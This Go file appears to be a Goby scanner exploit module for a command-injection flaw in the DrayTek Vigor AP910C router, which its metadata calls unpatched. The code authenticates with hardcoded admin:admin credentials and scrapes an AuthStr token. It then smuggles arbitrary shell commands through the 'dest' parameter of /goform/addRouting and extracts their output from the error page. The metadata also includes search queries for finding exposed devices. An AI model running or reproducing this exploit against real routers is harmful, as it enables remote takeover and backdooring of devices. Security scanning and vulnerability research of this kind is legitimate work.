package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "DrayTek Vigor AP910C Router Background Command Execution Vulnerability",
    "Description": "<p>DrayTek Vigor AP910C is a wireless router product with firewall function from DrayTek. DrayTek Vigor AP910C has a background RCE vulnerability.</p><p>Attackers can use this vulnerability to arbitrarily execute code on the device to write backdoors, obtain device permissions, and then control the entire device.</p>",
    "Product": "DrayTek-Vigor-AP910C",
    "Homepage": "https://www.draytek.com/en/products/products-a-z/wireless-ap.all/vigorap-910c/",
    "DisclosureDate": "2023-03-06",
    "Author": "635477622@qq.com",
    "FofaQuery": "header=\"realm=\\\"VigorAP910C\" || banner=\"realm=\\\"VigorAP910C\"",
    "GobyQuery": "header=\"realm=\\\"VigorAP910C\" || banner=\"realm=\\\"VigorAP910C\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the device to write backdoors, obtain device permissions, and then control the entire device.</p>",
    "Recommendation": "<p>The official has not fixed the vulnerability yet, please pay attention to the update of the manufacturer's homepage: <a href=\"https://www.draytek.com/en/products/products-a-z/wireless-ap.all/vigorap-910c/\">https://www.draytek.com/en/products/products-a-z/wireless-ap.all/vigorap-910c/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "ls /",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "DrayTek Vigor AP910C 路由器后台命令执行漏洞",
            "Product": "DrayTek-Vigor-AP910C",
            "Description": "<p>DrayTek Vigor AP910C 是居易科技（DrayTek）公司的一款带有防火墙功能的无线路由器产品。DrayTek Vigor AP910C 存在后台 RCE 漏洞。</p><p>攻击者可通过该漏洞在设备任意执行代码写入后门，获取设备权限，进而控制整个设备。</p>",
            "Recommendation": "<p>官方暂未修复该漏洞，请关注厂商主页更新：<a href=\"https://www.draytek.com/en/products/products-a-z/wireless-ap.all/vigorap-910c/\">https://www.draytek.com/en/products/products-a-z/wireless-ap.all/vigorap-910c/</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞在设备任意执行代码写入后门，获取设备权限，进而控制整个设备。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "DrayTek Vigor AP910C Router Background Command Execution Vulnerability",
            "Product": "DrayTek-Vigor-AP910C",
            "Description": "<p>DrayTek Vigor AP910C is a wireless router product with firewall function from DrayTek. DrayTek Vigor AP910C has a background RCE vulnerability.</p><p>Attackers can use this vulnerability to arbitrarily execute code on the device to write backdoors, obtain device permissions, and then control the entire device.</p>",
            "Recommendation": "<p>The official has not fixed the vulnerability yet, please pay attention to the update of the manufacturer's homepage: <a href=\"https://www.draytek.com/en/products/products-a-z/wireless-ap.all/vigorap-910c/\">https://www.draytek.com/en/products/products-a-z/wireless-ap.all/vigorap-910c/</a><br><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the device to write backdoors, obtain device permissions, and then control the entire device.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10832"
}`
	sendPayloadFlagAXE005342 := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewGetRequestConfig(uri)
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.Header.Store("Authorization", "Basic YWRtaW46YWRtaW4=")
		payloadRequestConfig.Header.Store("Referer", hostInfo.FixedHostInfo)
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}

	fetchAuthStrAX16847864E02 := func(hostInfo *httpclient.FixUrl) (string, error) {
		// 先获取 AuthStr
		authStr := ""
		resp0, err := sendPayloadFlagAXE005342(hostInfo, "/opmode.asp")
		if err != nil || resp0.StatusCode != 200 {
			return "", errors.New("获取 AuthStr 失败")
		}
		pattern := `<input\s+type="hidden"\s+value=(\w+)\s+name="AuthStr">`
		match := regexp.MustCompile(pattern).FindStringSubmatch(resp0.Utf8Html)
		if len(match) > 1 {
			authStr = match[1]
		}
		return authStr, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(10)
			authStr, err := fetchAuthStrAX16847864E02(hostInfo)
			if err != nil {
				return false
			}
			resp, err := sendPayloadFlagAXE005342(hostInfo, "/goform/addRouting?AuthStr="+authStr+"&dest=||+echo+$(+"+url.PathEscape("echo ")+checkString+")%3b%23a")
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, checkString) && strings.Contains(resp.Utf8Html, "Add routing failed")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			authStr, err := fetchAuthStrAX16847864E02(expResult.HostInfo)
			if err != nil {
				return expResult
			}
			resp, err := sendPayloadFlagAXE005342(expResult.HostInfo, "/goform/addRouting?AuthStr="+authStr+"&dest=||+echo+$(+"+url.QueryEscape(cmd)+")%3b%23a")
			if err != nil || resp.StatusCode != 200 {
				return expResult
			}
			pattern := `(?s)<h1>Add routing failed:<br>(.*)?<h1></body>`
			match := regexp.MustCompile(pattern).FindStringSubmatch(resp.Utf8Html)
			if len(match) > 1 {
				expResult.Output += match[1]
				expResult.Success = true
			}
			return expResult
		},
	))
}
